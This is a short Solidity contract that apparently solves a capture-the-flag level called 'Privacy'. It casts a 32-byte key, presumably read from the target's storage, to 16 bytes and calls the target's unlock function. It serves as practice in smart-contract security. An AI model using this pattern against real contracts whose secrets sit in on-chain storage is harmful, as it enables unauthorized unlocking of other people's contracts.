// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPrivacy{ // 1) change interface name

    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}

contract PrivacyAttack { // 2) change nameattck

    constructor() {

    }
    function attack(address target, bytes32 _key) external {

        bytes16 key = bytes16(_key);

        IPrivacy privacyattack = IPrivacy(target);

        privacyattack.unlock(key);

    }
}